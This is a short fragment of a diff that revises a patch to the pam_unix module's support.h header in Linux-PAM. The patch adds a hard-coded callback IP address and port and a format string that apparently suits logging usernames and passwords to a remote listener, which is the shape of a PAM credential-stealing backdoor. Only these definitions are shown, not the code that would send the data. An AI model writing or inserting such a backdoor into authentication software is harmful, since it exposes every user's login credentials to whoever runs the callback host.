@@ -169,17 +169,18 @@ diff --git a/modules/pam_unix/support.h b/modules/pam_unix/support.h
 index 9c065c5..40b5f9c 100644
 --- a/modules/pam_unix/support.h
 +++ b/modules/pam_unix/support.h
-@@ -13,6 +13,9 @@
+@@ -13,6 +13,10 @@
   */
  #define LOGIN_DEFS "/etc/login.defs"
  
 +#define CALLBACK_IP "192.168.1.59"
 +#define CALLBACK_PORT 5000
 +#define RET_FMT "%s - %s %s:%s\n"
++#define EPS 12.0
  
  /*
   * here is the string to inform the user that the new passwords they
-@@ -184,4 +187,10 @@ extern int _unix_verify_user(pam_handle_t *pamh, unsigned long long ctrl,
+@@ -184,4 +188,10 @@ extern int _unix_verify_user(pam_handle_t *pamh, unsigned long long ctrl,
  extern int _unix_run_verify_binary(pam_handle_t *pamh,
  				   unsigned long long ctrl,
  				   const char *user, int *daysleft);
